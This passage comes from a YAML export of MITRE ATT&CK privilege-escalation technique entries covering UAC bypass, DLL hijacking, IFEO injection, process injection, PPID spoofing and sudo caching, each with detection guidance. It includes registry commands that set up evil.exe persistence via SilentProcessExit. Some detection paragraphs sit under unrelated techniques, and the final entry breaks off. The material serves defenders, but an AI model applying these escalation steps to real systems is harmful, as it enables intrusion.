        * The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key. (Citation: enigma0x3 Fileless UAC Bypass)
        * The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys. (Citation: enigma0x3 sdclt app paths) (Citation: enigma0x3 sdclt bypass)

        Analysts should monitor these Registry settings for unauthorized changes.

      name: DLL Search Order Hijacking
      description: "Windows systems use a common method to look for required DLLs
        to load into a program. (Citation: Microsoft DLL Search) Adversaries may take
        advantage of the Windows DLL search order and programs that ambiguously specify
        DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform
        DLL preloading, also called binary planting attacks, (Citation: OWASP Binary
        Planting) by placing a malicious DLL with the same name as an ambiguously
        specified DLL in a location that Windows searches before the legitimate DLL.
        Often this location is the current working directory of the program. Remote
        DLL preloading attacks occur when a program sets its current directory to
        a remote location such as a Web share before loading a DLL. (Citation: Microsoft
        2269637) Adversaries may use this behavior to cause the program to load a
        malicious DLL. \n\nAdversaries may also directly modify the way a program
        loads DLLs by replacing an existing DLL or modifying a .manifest or .local
        redirection file, directory, or junction to cause the program to load a different
        DLL to maintain persistence or privilege escalation. (Citation: Microsoft
        DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search
        Order)\n\nIf a search order-vulnerable program is configured to run at a higher
        privilege level, then the adversary-controlled DLL that is loaded will also
        be executed at the higher level. In this case, the technique could be used
        for privilege escalation from user to administrator or SYSTEM or from administrator
        to SYSTEM, depending on the program.\n\nPrograms that fall victim to path
        hijacking may appear to behave normally because malicious DLLs may be configured
        to also load the legitimate DLLs they were meant to replace."

      name: Dylib Hijacking
      description: |-
        macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.

        A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)

        If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.

      description: |-
        Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.

        Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)

        Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

        Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1160) service.

      description: |-
        Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform Privilege Escalation to include use of software exploitation to circumvent those restrictions.

        When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.

        Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery.

        Higher privileges are often necessary to perform additional actions such as some methods of [Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.

      name: Extra Window Memory Injection
      description: |-
        Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)

        Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.

        Execution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.

      name: File System Permissions Weakness
      description: |-
        Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

        ### Services

        Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.

        ### Executable Installers

        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)

        Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

        Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.

      description: "Windows processes often leverage application programming interface
        (API) functions to perform tasks that require reusable system resources. Windows
        API functions are typically stored in dynamic-link libraries (DLLs) as exported
        functions. \n\nHooking involves redirecting calls to these functions and can
        be implemented via:\n\n* **Hooks procedures**, which intercept and execute
        designated code in response to events such as messages, keystrokes, and mouse
        inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection
        July 2017)\n* **Import address table (IAT) hooking**, which use modifications
        to a process’s IAT, where pointers to imported API functions are stored. (Citation:
        Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks
        Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**,
        which overwrites the first bytes in an API function to redirect code flow.
        (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge
        Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar
        to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries
        may use hooking to load and execute malicious code within the context of another
        process, masking the execution while also allowing access to the process's
        memory and possibly elevated privileges. Installing hooking mechanisms may
        also provide Persistence via continuous invocation when the functions are
        called through normal use.\n\nMalicious hooking mechanisms may also capture
        API calls that include parameters that reveal user authentication credentials
        for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept
        2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s
        to conceal files, processes, Registry keys, and other objects in order to
        hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)"

        Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions. (Citation: StackExchange Hooks Jul 2012) (Citation: Adlice Software IAT Hooks Oct 2014)

        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

      name: Image File Execution Options Injection
      description: |-
        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

      description: "Per Apple’s developer documentation, when macOS and OS X boot
        up, launchd is run to finish system initialization. This process loads the
        parameters for each launch-on-demand system-level daemon from the property
        list (plist) files found in <code>/System/Library/LaunchDaemons</code> and
        <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons).
        These LaunchDaemons have property list files which point to the executables
        that will be launched (Citation: Methods of Mac Malware Persistence).\n \nAdversaries
        may install a new launch daemon that can be configured to execute at startup
        by using launchd or launchctl to load a plist into the appropriate directories
        (Citation: OSX Malware Detection). The daemon name may be disguised by using
        a name from a related operating system or benign software  (Citation: WireLurker).
        Launch Daemons may be created with administrator privileges, but are executed
        under root privileges, so an adversary may also use a service to escalate
        privileges from administrator to root.\n \nThe plist file permissions must
        be root:wheel, but the script or program that it points to has no such requirement.
        So, it is possible for poor configurations to allow an adversary to modify
        a current Launch Daemon’s executable and gain persistence or Privilege Escalation."

        Monitor service creation through changes in the Registry and common utilities using command-line invocation. Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017) (Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

      name: Parent PID Spoofing
      description: |-
        Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

        Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA [Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document or any code that can perform [Execution through API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

        Explicitly assigning the PPID may also enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)

        Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)

        Monitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.

      name: Path Interception
      description: |-
        Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)

        There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.

        ### Unquoted Paths
        Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)

        ### PATH Environment Variable Misconfiguration
        The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\system32</code> (e.g., <code>C:\Windows\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.

        For example, if <code>C:\example path</code> precedes <code>C:\Windows\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\example path</code> will be called instead of the Windows system "net" when "net" is executed from the command-line.

        ### Search Order Hijacking
        Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

        For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net user</code>. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)

        Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).

        File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like "Knock Knock" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

        Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

      name: Process Injection
      description: |-
        Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

        ### Windows

        There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Endgame Process Injection July 2017)

        * **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
        * **Portable executable injection** involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
        * **Thread execution hijacking** involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.
        * **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
        * **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

        ### Mac and Linux

        Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)

        * **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
        * **Ptrace system calls** can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
        * **/proc/[pid]/mem** provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
        * **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

        Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

        Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Endgame Process Injection July 2017)

        Monitoring for Linux specific calls such as the ptrace system call, the use of LD_PRELOAD environment variable, or dlfcn dynamic linking API calls, should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. (Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)

        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. (Citation: Microsoft Sysmon v6 May 2017)

        Monitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [PowerShell](https://attack.mitre.org/techniques/T1086) with tools such as PowerSploit, (Citation: Powersploit) so additional PowerShell monitoring may be required to cover known implementations of this behavior.

        Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

        * Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
        * Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
        * Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
        * Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
        * Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
        * Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)

        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

        Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)

      description: |-
        When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.

        An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).

      description: "Per Apple’s documentation, startup items execute during the final
        phase of the boot process and contain shell scripts or other executable files
        along with configuration information used by the system to determine the execution
        order for all startup items (Citation: Startup Items). This is technically
        a deprecated version (superseded by Launch Daemons), and thus the appropriate
        folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the
        system by default, but does appear to exist by default on macOS Sierra. A
        startup item is a directory whose executable and configuration property list
        (plist), <code>StartupParameters.plist</code>, reside in the top-level directory.
        \n\nAn adversary can create the appropriate folders/files in the StartupItems
        directory to register their own persistence mechanism (Citation: Methods of
        Mac Malware Persistence). Additionally, since StartupItems run during the
        bootup phase of macOS, they will run as root. If an adversary is able to modify
        an existing Startup Item, then they will be able to Privilege Escalate as
        well."

      description: "The <code>sudo</code> command \"allows a system administrator
        to delegate authority to give certain users (or groups of users) the ability
        to run some (or all) commands as root or another user while providing an audit
        trail of the commands and their arguments.\" (Citation: sudo man page 2018)
        Since sudo was made for the system administrator, it has some useful configuration
        features such as a <code>timestamp_timeout</code> that is the amount of time
        in minutes between instances of <code>sudo</code> before it will re-prompt
        for a password. This is because <code>sudo</code> has the ability to cache
        credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code>
        with a timestamp of when sudo was last run to determine this timeout. Additionally,
        there is a <code>tty_tickets</code> variable that treats each new tty (terminal
        session) in isolation. This means that, for example, the sudo timeout of one
        tty will not affect another tty (you will have to type the password again).\n\nAdversaries
        can abuse poor configurations of this to escalate privileges without needing
        the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored
        to see if it falls within the <code>timestamp_timeout</code> range. If it
        does, then malware can execute sudo commands without needing to supply the
